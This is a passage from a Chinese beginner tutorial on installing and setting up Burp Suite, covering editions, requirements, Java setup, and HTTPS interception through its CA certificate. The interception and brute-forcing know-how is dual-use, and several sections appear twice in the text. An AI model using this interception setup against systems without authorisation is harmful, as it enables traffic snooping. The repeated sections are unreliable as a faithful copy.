  <line x1="40" y1="62" x2="1160" y2="62" stroke="#374151"/>
  <rect x="40" y="100" width="260" height="130" rx="16" fill="#1e293b" stroke="#64748b" stroke-width="2"/>
  <circle cx="68" cy="125" r="7" fill="#ef4444"/><circle cx="90" cy="125" r="7" fill="#f59e0b"/><circle cx="112" cy="125" r="7" fill="#10b981"/>
  <text x="140" y="129" fill="#cbd5e1" font-size="13" font-family="Arial">Firefox / Chrome + FoxyProxy</text>
  <rect x="60" y="150" width="220" height="28" rx="6" fill="#0f172a" stroke="#334155"/>
  <text x="70" y="170" fill="#22d3ee" font-size="13" font-family="Consolas">https://target.com/login.php</text>
  <text x="60" y="210" fill="#fbbf24" font-size="14" font-weight="bold" font-family="Microsoft YaHei">👆 所有请求/响应先经过代理！</text>
  <rect x="350" y="90" width="500" height="560" rx="22" fill="#1f2937" stroke="#f59e0b" stroke-width="3"/>
  <text x="375" y="126" fill="#fbbf24" font-size="22" font-weight="bold" font-family="Microsoft YaHei">🛡️ Burp Suite（中间人的大脑）</text>
  <line x1="370" y1="142" x2="830" y2="142" stroke="#4b5563"/>
  <rect x="370" y="160" width="220" height="110" rx="12" fill="#7c2d12" stroke="#f97316" stroke-width="2"/>
  <text x="388" y="186" fill="#fed7aa" font-size="16" font-weight="bold" font-family="Microsoft YaHei">① Proxy · 代理</text>
  <rect x="382" y="198" width="196" height="22" rx="4" fill="#000" stroke="#431407"/>
  <text x="390" y="214" fill="#f97316" font-size="12" font-family="Consolas">监听器 127.0.0.1:8080</text>
  <text x="388" y="242" fill="#e2e8f0" font-size="13" font-family="Microsoft YaHei">Intercept On / Off · Forward / Drop</text>
  <text x="388" y="260" fill="#e2e8f0" font-size="13" font-family="Microsoft YaHei">HTTP history · WebSocket history</text>
  <path d="M300 165 C 320 165, 320 165, 350 165" stroke="#fbbf24" stroke-width="3" marker-end="url(#arrow1c01)" fill="none"/>
  <path d="M350 200 C 320 200, 320 200, 300 200" stroke="#34d399" stroke-width="3" marker-end="url(#arrow2c01)" fill="none"/>
  <text x="305" y="155" fill="#fbbf24" font-size="12" font-family="Microsoft YaHei">→ 请求</text>
  <text x="305" y="216" fill="#34d399" font-size="12" font-family="Microsoft YaHei">← 响应</text>
  <rect x="610" y="160" width="220" height="110" rx="12" fill="#111827" stroke="#a855f7" stroke-width="2"/>
  <text x="628" y="186" fill="#e9d5ff" font-size="16" font-weight="bold" font-family="Microsoft YaHei">② HTTP 历史</text>
  <text x="626" y="212" fill="#cbd5e1" font-size="12" font-family="Consolas"># Method URL Status</text>
  <text x="626" y="230" fill="#22d3ee" font-size="12" font-family="Consolas">1 POST /login 302</text>
  <text x="626" y="248" fill="#f87171" font-size="12" font-family="Consolas">2 GET /admin 403</text>
  <text x="626" y="266" fill="#4ade80" font-size="12" font-family="Consolas">3 GET /index 200</text>
  <line x1="590" y1="215" x2="610" y2="215" stroke="#a855f7" stroke-width="2" marker-end="url(#arrow1c01)"/>
  <rect x="370" y="295" width="220" height="100" rx="12" fill="#111827" stroke="#22d3ee" stroke-width="2"/>
  <text x="388" y="322" fill="#a5f3fc" font-size="16" font-weight="bold" font-family="Microsoft YaHei">③ Target · 站点地图</text>
  <text x="388" y="348" fill="#e2e8f0" font-size="12" font-family="Microsoft YaHei">🔲 Add to scope · Scope 过滤</text>
  <text x="388" y="370" fill="#e2e8f0" font-size="12" font-family="Microsoft YaHei">🔲 右键 Send to 其他模块</text>
  <rect x="370" y="410" width="220" height="100" rx="12" fill="#111827" stroke="#f472b6" stroke-width="2"/>
  <text x="388" y="437" fill="#fce7f3" font-size="16" font-weight="bold" font-family="Microsoft YaHei">⑤ Repeater · 请求重放</text>
  <text x="388" y="463" fill="#e2e8f0" font-size="12" font-family="Microsoft YaHei">🔲 手动改参数 · Send 发送</text>
  <text x="388" y="485" fill="#e2e8f0" font-size="12" font-family="Microsoft YaHei">🔲 左请求 / 右响应对照</text>
  <rect x="370" y="525" width="220" height="100" rx="12" fill="#111827" stroke="#ef4444" stroke-width="2"/>
  <text x="388" y="552" fill="#fecaca" font-size="16" font-weight="bold" font-family="Microsoft YaHei">⑦ Intruder · 爆破/Fuzz</text>
  <text x="388" y="578" fill="#e2e8f0" font-size="12" font-family="Microsoft YaHei">🔲 4种攻击：Sniper / Pitchfork</text>
  <text x="388" y="600" fill="#e2e8f0" font-size="12" font-family="Microsoft YaHei">🔲 加字典 · 找密码/未授权</text>
  <rect x="610" y="295" width="220" height="100" rx="12" fill="#111827" stroke="#10b981" stroke-width="2"/>
  <text x="628" y="322" fill="#bbf7d0" font-size="16" font-weight="bold" font-family="Microsoft YaHei">④ Spider / Scanner</text>
  <text x="628" y="348" fill="#e2e8f0" font-size="12" font-family="Microsoft YaHei">🔲 Spider 自动爬 URL</text>
  <text x="628" y="370" fill="#e2e8f0" font-size="12" font-family="Microsoft YaHei">🔲 Scanner 专业版自动扫漏洞</text>
  <rect x="610" y="410" width="220" height="100" rx="12" fill="#111827" stroke="#34d399" stroke-width="2"/>
  <text x="628" y="437" fill="#d1fae5" font-size="16" font-weight="bold" font-family="Microsoft YaHei">⑥ Decoder · 编码解码</text>
  <text x="628" y="463" fill="#e2e8f0" font-size="12" font-family="Microsoft YaHei">🔲 Base64 / URL / Hex / ASCII</text>
  <text x="628" y="485" fill="#e2e8f0" font-size="12" font-family="Microsoft YaHei">🔲 Smart decode 智能识别</text>
  <rect x="610" y="525" width="220" height="100" rx="12" fill="#111827" stroke="#38bdf8" stroke-width="2"/>
  <text x="628" y="552" fill="#e0f2fe" font-size="16" font-weight="bold" font-family="Microsoft YaHei">⑧ Comparer · 数据对比</text>
  <text x="628" y="578" fill="#e2e8f0" font-size="12" font-family="Microsoft YaHei">🔲 Words / Bytes 两按钮对比</text>
  <text x="628" y="600" fill="#e2e8f0" font-size="12" font-family="Microsoft YaHei">🔲 越权 / SQL盲注差异</text>
  <line x1="480" y1="395" x2="480" y2="410" stroke="#fbbf24" stroke-width="2" marker-end="url(#arrow1c01)"/>
  <line x1="480" y1="510" x2="480" y2="525" stroke="#fbbf24" stroke-width="2" marker-end="url(#arrow1c01)"/>
  <line x1="720" y1="395" x2="720" y2="410" stroke="#fbbf24" stroke-width="2" marker-end="url(#arrow1c01)"/>
  <line x1="720" y1="510" x2="720" y2="525" stroke="#fbbf24" stroke-width="2" marker-end="url(#arrow1c01)"/>
  <line x1="480" y1="270" x2="480" y2="295" stroke="#fbbf24" stroke-width="2" marker-end="url(#arrow1c01)"/>
  <line x1="720" y1="270" x2="720" y2="295" stroke="#fbbf24" stroke-width="2" marker-end="url(#arrow1c01)"/>
  <rect x="900" y="220" width="260" height="220" rx="18" fill="#1e293b" stroke="#10b981" stroke-width="2"/>
  <text x="920" y="254" fill="#bbf7d0" font-size="20" font-weight="bold" font-family="Microsoft YaHei">🎯 Web 靶场 / 真实目标</text>
  <line x1="920" y1="270" x2="1140" y2="270" stroke="#475569"/>
  <rect x="920" y="288" width="220" height="120" rx="10" fill="#0f172a" stroke="#334155"/>
  <text x="932" y="314" fill="#fbbf24" font-size="13" font-weight="bold" font-family="Microsoft YaHei">🔑 HTTPS 真实证书链</text>
  <text x="932" y="338" fill="#cbd5e1" font-size="13" font-family="Microsoft YaHei">Nginx / Apache / PHP</text>
  <text x="932" y="360" fill="#cbd5e1" font-size="13" font-family="Microsoft YaHei">MySQL / Redis 数据库</text>
  <text x="932" y="382" fill="#cbd5e1" font-size="13" font-family="Microsoft YaHei">WAF / CDN / 云防护</text>
  <text x="920" y="424" fill="#f87171" font-size="13" font-family="Microsoft YaHei">⚠️ 这里才是真正的攻击对象</text>
  <path d="M850 280 C 875 280, 875 280, 900 280" stroke="#fbbf24" stroke-width="3" marker-end="url(#arrow1c01)" fill="none"/>
  <path d="M900 340 C 875 340, 875 340, 850 340" stroke="#34d399" stroke-width="3" marker-end="url(#arrow2c01)" fill="none"/>
  <text x="856" y="270" fill="#fbbf24" font-size="12" font-family="Microsoft YaHei">Burp转发请求→</text>
  <text x="856" y="356" fill="#34d399" font-size="12" font-family="Microsoft YaHei">←靶场响应回Burp</text>
  <rect x="40" y="670" width="1120" height="34" rx="8" fill="#111827" stroke="#475569"/>
  <text x="58" y="693" fill="#fde68a" font-size="13" font-weight="bold" font-family="Microsoft YaHei">💡 记住顺序：浏览器→代理(Proxy)→HTTP历史存底→手动送Repeater改参→批量送Intruder爆破→编码送Decoder→差异送Comparer</text>
</svg>


### Burp Suite 的版本

Burp Suite 有三个版本：

| 版本 | 价格 | 功能 | 适用人群 |
|------|------|------|----------|
| **社区版（Community Edition）** | 免费 | Proxy、Target、Spider、Repeater、Decoder、Comparer | 初学者、学习使用 |
| **专业版（Professional）** | $449/年 | 包含社区版功能 + Scanner、Intruder、Sequencer | 专业渗透测试人员 |
| **企业版（Enterprise）** | $3999/年起 | 包含专业版功能 + 自动化扫描、CI/CD集成 | 企业安全团队 |

**初学者建议**：先用免费的社区版学习基本功能，熟练后再考虑购买专业版。社区版虽然功能有限，但对于学习Web安全基础已经足够。

---

## 1.2 系统环境要求

### 硬件要求

Burp Suite 是一个Java程序，对硬件要求不高：

- **CPU**：任何现代CPU都可以，推荐双核以上
- **内存**：至少4GB，推荐8GB以上（扫描大型网站时需要更多内存）
- **硬盘**：至少500MB可用空间
- **显示器**：推荐分辨率1920×1080以上

### 软件要求

| 操作系统 | 支持情况 |
|----------|----------|
| Windows 10/11 | ✅ 完全支持 |
| Windows 7/8 | ✅ 支持，但建议升级 |
| macOS 10.13+ | ✅ 完全支持 |
| Linux | ✅ 完全支持 |

### Java环境要求

Burp Suite 需要Java环境才能运行：

- **Java版本**：Java 8 到 Java 17（推荐Java 11或17）
- **JDK/JRE**：都可以，只需要JRE即可运行

> 💡 **小贴士**：Burp Suite 专业版下载时可以选择"包含JRE"的版本，这样就不需要单独安装Java了。社区版需要自行安装Java环境。

---

## 1.3 Windows 系统安装教程

### 步骤1：下载 Burp Suite

**下载社区版（免费）：**
1. 访问官网：https://portswigger.net/burp/communitydesktop
2. 点击"Download"按钮
3. 选择Windows版本下载

**下载专业版（付费）：**
1. 访问官网：https://portswigger.net/burp/pro
2. 购买后登录账户
3. 在下载页面选择Windows版本
4. 可以选择"Standalone JAR file"（需要自行安装Java）或"Windows installer"（包含Java环境）

### 步骤2：安装 Java 环境（社区版需要）

如果你下载的是社区版或者选择不包含Java的专业版，需要先安装Java：

1. 访问Java下载页面：https://www.java.com/download/
2. 下载Windows版本的Java安装包
3. 双击安装包，按照提示安装
4. 安装完成后，打开命令提示符，输入：
   ```
   java -version
   ```
   如果显示版本信息，说明Java安装成功

### 步骤3：安装 Burp Suite

**方式一：使用安装程序（推荐新手）**

如果你下载的是`.exe`安装文件：
1. 双击安装文件
2. 选择安装目录（默认即可）
3. 点击"Next"直到完成安装
4. 安装完成后，桌面会出现Burp Suite图标

**方式二：使用JAR文件**

如果你下载的是`.jar`文件：
1. 将`.jar`文件放在一个固定的目录（如`D:\BurpSuite`）
2. 双击`.jar`文件即可运行（如果Java安装正确）
3. 如果双击无法运行，可以创建一个启动脚本：

   创建`burpsuite.bat`文件，内容如下：
   ```batch
   @echo off
   java -jar burpsuite_community.jar
   pause
   ```

### 步骤4：首次启动配置

第一次启动Burp Suite时，会看到一个临时项目选择界面：

**🖥️ 首次启动界面示意图：**

<svg viewBox="0 0 800 400" xmlns="http://www.w3.org/2000/svg" style="width:100%;max-width:800px;">

  <defs>
    <linearGradient id="winBg" x1="0" y1="0" x2="0" y2="1">
      <stop offset="0%" stop-color="#1e293b"/>
      <stop offset="100%" stop-color="#0f172a"/>
    </linearGradient>
  </defs>
  <!-- 窗口 -->
  <rect width="800" height="400" rx="12" fill="url(#winBg)" stroke="#475569" stroke-width="1"/>
  <!-- 标题栏 -->
  <rect x="0" y="0" width="800" height="36" rx="12" fill="#334155"/>
  <rect x="0" y="12" width="800" height="24" fill="#334155"/>
  <circle cx="22" cy="18" r="7" fill="#ef4444"/>
  <circle cx="44" cy="18" r="7" fill="#f59e0b"/>
  <circle cx="66" cy="18" r="7" fill="#10b981"/>
  <text x="400" y="24" text-anchor="middle" fill="#e2e8f0" font-size="13" font-family="Arial">Burp Suite Community Edition</text>
  <!-- 新建项目面板 -->
  <rect x="50" y="70" width="700" height="300" rx="10" fill="#0f172a" stroke="#7c3aed" stroke-width="2"/>
  <rect x="50" y="70" width="700" height="44" rx="10" fill="#7c3aed"/>
  <rect x="50" y="92" width="700" height="22" fill="#7c3aed"/>
  <text x="85" y="99" fill="#fff" font-size="15" font-weight="bold" font-family="Arial">📋 欢迎使用 Burp Suite - 请选择项目类型</text>
  <!-- 选项1: 临时项目 -->
  <g>
    <rect x="80" y="136" width="640" height="56" rx="8" fill="#1e293b" stroke="#475569" stroke-width="1.5"/>
    <circle cx="105" cy="164" r="10" fill="none" stroke="#94a3b8" stroke-width="2"/>
    <circle cx="105" cy="164" r="4" fill="#7c3aed"/>
    <text x="130" y="158" fill="#e2e8f0" font-size="14" font-weight="bold" font-family="Arial">Temporary project · 临时项目</text>
    <text x="130" y="178" fill="#94a3b8" font-size="12" font-family="Arial">快速启动，关闭后数据不保存，适合临时测试</text>
  </g>
  <!-- 选项2: 新建项目（选中） -->
  <g>
    <rect x="80" y="206" width="640" height="56" rx="8" fill="#4c1d95" stroke="#a78bfa" stroke-width="2.5"/>
    <circle cx="105" cy="234" r="10" fill="#7c3aed" stroke="#c4b5fd" stroke-width="2"/>
    <path d="M 100 234 l 3 3 l 6 -7" stroke="#fff" stroke-width="2" fill="none"/>
    <text x="130" y="228" fill="#fff" font-size="14" font-weight="bold" font-family="Arial">✓ New project on disk · 新建磁盘项目（推荐）</text>
    <text x="130" y="248" fill="#ddd6fe" font-size="12" font-family="Arial">数据保存到本地硬盘，可随时打开继续测试</text>
  </g>
  <!-- 选项3: 打开已有 -->
  <g>
    <rect x="80" y="276" width="640" height="56" rx="8" fill="#1e293b" stroke="#475569" stroke-width="1.5"/>
    <circle cx="105" cy="304" r="10" fill="none" stroke="#94a3b8" stroke-width="2"/>
    <text x="130" y="298" fill="#e2e8f0" font-size="14" font-weight="bold" font-family="Arial">Open existing project · 打开已有项目</text>
    <text x="130" y="318" fill="#94a3b8" font-size="12" font-family="Arial">浏览并打开之前保存过的 .burp 项目文件</text>
  </g>
  <!-- 按钮 -->
  <rect x="600" y="348" width="130" height="36" rx="6" fill="#7c3aed"/>
  <text x="665" y="371" text-anchor="middle" fill="#fff" font-size="14" font-weight="bold" font-family="Arial">Start Burp →</text>
</svg>

1. **选择项目类型**：
   - "Temporary project"：临时项目，关闭后数据不保存
   - "New project on disk"：新建项目，数据保存到硬盘
   - "Open existing project"：打开已有项目
   
   建议选择"New project on disk"，方便保存测试数据

2. **选择配置文件**：
   - "Use Burp defaults"：使用默认配置
   - "Use saved options"：使用保存的配置
   
   初学者选择"Use Burp defaults"即可

3. 点击"Start Burp"，Burp Suite主界面就会打开

---

## 1.4 Linux/Kali 系统安装教程

### Kali Linux（推荐）

如果你使用Kali Linux，Burp Suite已经预装好了！

启动方式：
```bash
# 在菜单中找到
Applications → Web Applications → Web Application Fuzzers → burpsuite

# 或者在终端中启动
burpsuite
```

### 其他Linux系统安装

**步骤1：安装Java环境**
```bash
# Ubuntu/Debian
sudo apt update
sudo apt install default-jre

# CentOS/RHEL
sudo yum install java-11-openjdk
```

**步骤2：下载 Burp Suite**
```bash
# 创建目录
mkdir ~/burpsuite
cd ~/burpsuite

# 下载JAR文件（社区版）
wget https://portswigger.net/burp/releases/download?product=community&version=latest&type=Jar

# 文件名可能很长，可以重命名
mv download* burpsuite_community.jar
```

**步骤3：启动 Burp Suite**
```bash
java -jar burpsuite_community.jar
```

**步骤4：创建启动快捷方式**

创建桌面快捷方式文件：
```bash
# 创建桌面文件
nano ~/.local/share/applications/burpsuite.desktop
```

内容如下：
```
[Desktop Entry]
Name=Burp Suite
Comment=Web Security Testing Tool
Exec=java -jar ~/burpsuite/burpsuite_community.jar
Icon=burpsuite
Terminal=false
Type=Application
Categories=Network;Security;
```

---

## 1.5 macOS 系统安装教程

### 步骤1：安装 Java 环境

macOS安装Java推荐使用Homebrew：

```bash
# 安装Homebrew（如果还没有）
# 访问 https://brew.sh 获取安装命令

# 安装Java
brew install openjdk@17

# 添加到系统PATH
sudo ln -sfn /usr/local/opt/openjdk@17/libexec/openjdk.jdk /Library/Java/JavaVirtualMachines/openjdk-17.jdk
```

验证安装：
```bash
java -version
```

### 步骤2：下载和安装 Burp Suite

**方式一：DMG安装包**
1. 访问官网下载macOS版本的DMG文件
2. 双击DMG文件
3. 将Burp Suite拖拽到Applications文件夹
4. 在Applications中双击启动

**方式二：JAR文件**
```bash
# 创建目录
mkdir ~/burpsuite
cd ~/burpsuite

# 下载JAR文件
curl -O https://portswigger.net/burp/releases/download?product=community&version=latest&type=Jar

# 重命名
mv download* burpsuite_community.jar

# 启动
java -jar burpsuite_community.jar
```

---

## 1.6 JDK环境配置详解

### Windows环境变量配置

如果Java安装正确但Burp Suite无法启动，可能需要配置环境变量：

**步骤1：找到Java安装路径**

Java通常安装在以下位置：
- `C:\Program Files\Java\jdk-17`
- `C:\Program Files\Java\jre-17`
- `C:\Program Files (x86)\Java\...`

**步骤2：配置环境变量**

1. 右键"此电脑" → "属性"
2. 点击"高级系统设置"
3. 点击"环境变量"
4. 在"系统变量"中找到"JAVA_HOME"：
   - 如果没有，点击"新建"
   - 变量名：`JAVA_HOME`
   - 变量值：Java安装路径（如`C:\Program Files\Java\jdk-17`）

5. 在"系统变量"中找到"Path"，点击"编辑"：
   - 添加：`%JAVA_HOME%\bin`

6. 点击"确定"保存

**步骤3：验证配置**

打开新的命令提示符，输入：
```batch
java -version
javac -version
```

如果都显示版本信息，说明配置成功。

### Linux环境变量配置

```bash
# 查找Java安装路径
which java
readlink -f $(which java)

# 编辑环境变量
nano ~/.bashrc

# 添加以下内容（假设Java安装在/usr/lib/jvm/java-17-openjdk）
export JAVA_HOME=/usr/lib/jvm/java-17-openjdk
export PATH=$JAVA_HOME/bin:$PATH

# 保存后刷新
source ~/.bashrc
```

---

## 1.7 CA证书安装详解

### 为什么需要安装证书？

想象一下，你和朋友打电话，但有人在中间监听。HTTP协议就像是普通电话，监听者可以听到所有内容。HTTPS协议就像是加密电话，只有你和朋友能听懂，监听者听到的全是乱码。

Burp Suite要拦截HTTPS流量，就需要"解密"这些加密内容。为此，Burp Suite会假装自己是目标网站，生成一个"假证书"给浏览器。但浏览器不认识这个假证书，会报警说不安全。

为了解决这个问题，我们需要把Burp Suite的证书安装到浏览器中，让浏览器信任Burp Suite生成的所有证书。

**🔐 HTTPS 中间人（MITM）证书原理：**

<svg viewBox="0 0 800 380" xmlns="http://www.w3.org/2000/svg" style="width:100%;max-width:800px;">

  <defs>
    <linearGradient id="mitmBg" x1="0" y1="0" x2="1" y2="1">
      <stop offset="0%" stop-color="#0c0a1f"/>
      <stop offset="100%" stop-color="#1e1b4b"/>
    </linearGradient>
    <marker id="arrR" viewBox="0 0 10 10" refX="9" refY="5" markerWidth="8" markerHeight="8" orient="auto-start-reverse">
      <path d="M 0 0 L 10 5 L 0 10 z" fill="#22d3ee"/>
    </marker>
    <marker id="arrL" viewBox="0 0 10 10" refX="1" refY="5" markerWidth="8" markerHeight="8" orient="auto-start-reverse">
      <path d="M 10 0 L 0 5 L 10 10 z" fill="#f472b6"/>
    </marker>
  </defs>
  <rect width="800" height="380" rx="14" fill="url(#mitmBg)"/>
  <text x="400" y="28" text-anchor="middle" fill="#e2e8f0" font-size="16" font-weight="bold" font-family="Arial">Burp Suite CA 证书 HTTPS 中间人解密原理</text>

  <!-- 浏览器 -->
  <g>
    <rect x="30" y="60" width="160" height="110" rx="12" fill="#0ea5e9" opacity="0.2" stroke="#38bdf8" stroke-width="2"/>
    <text x="110" y="102" text-anchor="middle" fill="#7dd3fc" font-size="26">🌐</text>
    <text x="110" y="130" text-anchor="middle" fill="#fff" font-size="15" font-weight="bold" font-family="Arial">用户浏览器</text>
    <text x="110" y="152" text-anchor="middle" fill="#bae6fd" font-size="12" font-family="Arial">✅ 已信任 Burp CA</text>
  </g>
  <!-- Burp -->
  <g>
    <rect x="320" y="60" width="160" height="110" rx="12" fill="#7c3aed" opacity="0.25" stroke="#a78bfa" stroke-width="2.5"/>
    <text x="400" y="100" text-anchor="middle" fill="#c4b5fd" font-size="24">🕵️</text>
    <text x="400" y="128" text-anchor="middle" fill="#fff" font-size="15" font-weight="bold" font-family="Arial">Burp Suite Proxy</text>
    <text x="400" y="150" text-anchor="middle" fill="#ddd6fe" font-size="12" font-family="Arial">伪造网站证书给浏览器</text>
    <text x="400" y="166" text-anchor="middle" fill="#ddd6fe" font-size="11" font-family="Arial">(端口: 127.0.0.1:8080)</text>
  </g>
  <!-- 真实网站 -->
  <g>
    <rect x="610" y="60" width="160" height="110" rx="12" fill="#10b981" opacity="0.2" stroke="#34d399" stroke-width="2"/>
    <text x="690" y="102" text-anchor="middle" fill="#6ee7b7" font-size="26">🖥️</text>
    <text x="690" y="130" text-anchor="middle" fill="#fff" font-size="15" font-weight="bold" font-family="Arial">真实 Web 服务器</text>
    <text x="690" y="152" text-anchor="middle" fill="#a7f3d0" font-size="12" font-family="Arial">持有官方 CA 证书</text>
  </g>

  <!-- 请求箭头（左->中） -->
  <line x1="190" y1="115" x2="320" y2="115" stroke="#22d3ee" stroke-width="2.5" marker-end="url(#arrR)"/>
  <text x="255" y="104" text-anchor="middle" fill="#67e8f9" font-size="12" font-weight="bold" font-family="Arial">① HTTPS 请求</text>
  <text x="255" y="133" text-anchor="middle" fill="#67e8f9" font-size="11" font-family="Arial">(Burp假证书加密)</text>

  <!-- 请求箭头（中->右） -->
  <line x1="480" y1="115" x2="610" y2="115" stroke="#22d3ee" stroke-width="2.5" marker-end="url(#arrR)"/>
  <text x="545" y="104" text-anchor="middle" fill="#67e8f9" font-size="12" font-weight="bold" font-family="Arial">② 转发请求</text>
  <text x="545" y="133" text-anchor="middle" fill="#67e8f9" font-size="11" font-family="Arial">(真实证书加密)</text>

  <!-- 响应箭头（右->中） -->
  <line x1="610" y1="160" x2="480" y2="160" stroke="#f472b6" stroke-width="2.5" marker-end="url(#arrL)"/>
  <text x="545" y="149" text-anchor="middle" fill="#f9a8d4" font-size="12" font-weight="bold" font-family="Arial">③ 网站响应</text>
  <text x="545" y="178" text-anchor="middle" fill="#f9a8d4" font-size="11" font-family="Arial">(Burp 解密→明文查看)</text>

  <!-- 响应箭头（中->左） -->
  <line x1="320" y1="160" x2="190" y2="160" stroke="#f472b6" stroke-width="2.5" marker-end="url(#arrL)"/>
  <text x="255" y="149" text-anchor="middle" fill="#f9a8d4" font-size="12" font-weight="bold" font-family="Arial">④ 返回响应</text>
  <text x="255" y="178" text-anchor="middle" fill="#f9a8d4" font-size="11" font-family="Arial">(Burp重新加密给浏览器)</text>

  <!-- 底部说明 -->
  <g>
    <rect x="60" y="215" width="680" height="145" rx="10" fill="#111827" stroke="#374151"/>
    <text x="90" y="246" fill="#f59e0b" font-weight="bold" font-size="14" font-family="Arial">⭐ 关键：Burp 作为双端中间人</text>
    <text x="90" y="272" fill="#d1d5db" font-size="13" font-family="Arial">• 对浏览器：Burp 伪装成"目标网站"，用自己的 CA 签发假证书 → 浏览器因为信任 Burp CA 所以不报风险</text>
    <text x="90" y="295" fill="#d1d5db" font-size="13" font-family="Arial">• 对网站：Burp 伪装成"用户"，正常和服务器建立真正的 HTTPS 连接</text>
    <text x="90" y="318" fill="#d1d5db" font-size="13" font-family="Arial">• 中间 Burp 同时拥有两边的明文 → 你就能看到、修改所有 HTTPS 数据</text>
    <text x="90" y="344" fill="#ef4444" font-size="13" font-weight="bold" font-family="Arial">⚠️ 风险提示：这也是所有 HTTPS 攻击的原理，所以千万不要随意安装未知的根证书！</text>
  </g>


1. **选择项目类型**：
   - "Temporary project"：临时项目，关闭后数据不保存
   - "New project on disk"：新建项目，数据保存到硬盘
   - "Open existing project"：打开已有项目
   
   建议选择"New project on disk"，方便保存测试数据

2. **选择配置文件**：
   - "Use Burp defaults"：使用默认配置
   - "Use saved options"：使用保存的配置
   
   初学者选择"Use Burp defaults"即可

3. 点击"Start Burp"，Burp Suite主界面就会打开

---

## 1.4 Linux/Kali 系统安装教程

### Kali Linux（推荐）

如果你使用Kali Linux，Burp Suite已经预装好了！

启动方式：
```bash
# 在菜单中找到
Applications → Web Applications → Web Application Fuzzers → burpsuite

# 或者在终端中启动
burpsuite
```

### 其他Linux系统安装

**步骤1：安装Java环境**
```bash
# Ubuntu/Debian
sudo apt update
sudo apt install default-jre

# CentOS/RHEL
sudo yum install java-11-openjdk
```

**步骤2：下载 Burp Suite**
```bash
# 创建目录
mkdir ~/burpsuite
cd ~/burpsuite

# 下载JAR文件（社区版）
wget https://portswigger.net/burp/releases/download?product=community&version=latest&type=Jar

# 文件名可能很长，可以重命名
mv download* burpsuite_community.jar
```

**步骤3：启动 Burp Suite**
```bash
java -jar burpsuite_community.jar
```

**步骤4：创建启动快捷方式**

创建桌面快捷方式文件：
```bash
# 创建桌面文件
nano ~/.local/share/applications/burpsuite.desktop
```

内容如下：
```
[Desktop Entry]
Name=Burp Suite
Comment=Web Security Testing Tool
Exec=java -jar ~/burpsuite/burpsuite_community.jar
Icon=burpsuite
Terminal=false
Type=Application
Categories=Network;Security;
```

---

## 1.5 macOS 系统安装教程

### 步骤1：安装 Java 环境

macOS安装Java推荐使用Homebrew：

```bash
# 安装Homebrew（如果还没有）
# 访问 https://brew.sh 获取安装命令

# 安装Java
brew install openjdk@17

# 添加到系统PATH
sudo ln -sfn /usr/local/opt/openjdk@17/libexec/openjdk.jdk /Library/Java/JavaVirtualMachines/openjdk-17.jdk
```

验证安装：
```bash
java -version
```

### 步骤2：下载和安装 Burp Suite

**方式一：DMG安装包**
1. 访问官网下载macOS版本的DMG文件
2. 双击DMG文件
3. 将Burp Suite拖拽到Applications文件夹
4. 在Applications中双击启动

**方式二：JAR文件**
```bash
# 创建目录
mkdir ~/burpsuite
cd ~/burpsuite

# 下载JAR文件
curl -O https://portswigger.net/burp/releases/download?product=community&version=latest&type=Jar

# 重命名
mv download* burpsuite_community.jar

# 启动
java -jar burpsuite_community.jar
```

---

## 1.6 JDK环境配置详解

### Windows环境变量配置

如果Java安装正确但Burp Suite无法启动，可能需要配置环境变量：

**步骤1：找到Java安装路径**

Java通常安装在以下位置：
- `C:\Program Files\Java\jdk-17`
- `C:\Program Files\Java\jre-17`
- `C:\Program Files (x86)\Java\...`

**步骤2：配置环境变量**

1. 右键"此电脑" → "属性"
2. 点击"高级系统设置"
3. 点击"环境变量"
4. 在"系统变量"中找到"JAVA_HOME"：
   - 如果没有，点击"新建"
   - 变量名：`JAVA_HOME`
   - 变量值：Java安装路径（如`C:\Program Files\Java\jdk-17`）

5. 在"系统变量"中找到"Path"，点击"编辑"：
   - 添加：`%JAVA_HOME%\bin`

6. 点击"确定"保存

**步骤3：验证配置**

打开新的命令提示符，输入：
```batch
java -version
javac -version
```

如果都显示版本信息，说明配置成功。

### Linux环境变量配置

```bash
# 查找Java安装路径
which java
readlink -f $(which java)

# 编辑环境变量
nano ~/.bashrc

# 添加以下内容（假设Java安装在/usr/lib/jvm/java-17-openjdk）
export JAVA_HOME=/usr/lib/jvm/java-17-openjdk
export PATH=$JAVA_HOME/bin:$PATH

# 保存后刷新
source ~/.bashrc
```

---

## 1.7 CA证书安装详解

### 为什么需要安装证书？

想象一下，你和朋友打电话，但有人在中间监听。HTTP协议就像是普通电话，监听者可以听到所有内容。HTTPS协议就像是加密电话，只有你和朋友能听懂，监听者听到的全是乱码。

Burp Suite要拦截HTTPS流量，就需要"解密"这些加密内容。为此，Burp Suite会假装自己是目标网站，生成一个"假证书"给浏览器。但浏览器不认识这个假证书，会报警说不安全。

为了解决这个问题，我们需要把Burp Suite的证书安装到浏览器中，让浏览器信任Burp Suite生成的所有证书。

**🔐 HTTPS 中间人（MITM）证书原理：**

<svg viewBox="0 0 800 380" xmlns="http://www.w3.org/2000/svg" style="width:100%;max-width:800px;">

  <defs>
    <linearGradient id="mitmBg" x1="0" y1="0" x2="1" y2="1">
      <stop offset="0%" stop-color="#0c0a1f"/>
      <stop offset="100%" stop-color="#1e1b4b"/>
    </linearGradient>
    <marker id="arrR" viewBox="0 0 10 10" refX="9" refY="5" markerWidth="8" markerHeight="8" orient="auto-start-reverse">
      <path d="M 0 0 L 10 5 L 0 10 z" fill="#22d3ee"/>
    </marker>
    <marker id="arrL" viewBox="0 0 10 10" refX="1" refY="5" markerWidth="8" markerHeight="8" orient="auto-start-reverse">
      <path d="M 10 0 L 0 5 L 10 10 z" fill="#f472b6"/>
    </marker>
  </defs>
  <rect width="800" height="380" rx="14" fill="url(#mitmBg)"/>
  <text x="400" y="28" text-anchor="middle" fill="#e2e8f0" font-size="16" font-weight="bold" font-family="Arial">Burp Suite CA 证书 HTTPS 中间人解密原理</text>

  <!-- 浏览器 -->
  <g>
    <rect x="30" y="60" width="160" height="110" rx="12" fill="#0ea5e9" opacity="0.2" stroke="#38bdf8" stroke-width="2"/>
    <text x="110" y="102" text-anchor="middle" fill="#7dd3fc" font-size="26">🌐</text>
    <text x="110" y="130" text-anchor="middle" fill="#fff" font-size="15" font-weight="bold" font-family="Arial">用户浏览器</text>
    <text x="110" y="152" text-anchor="middle" fill="#bae6fd" font-size="12" font-family="Arial">✅ 已信任 Burp CA</text>
  </g>
  <!-- Burp -->
  <g>
    <rect x="320" y="60" width="160" height="110" rx="12" fill="#7c3aed" opacity="0.25" stroke="#a78bfa" stroke-width="2.5"/>
    <text x="400" y="100" text-anchor="middle" fill="#c4b5fd" font-size="24">🕵️</text>
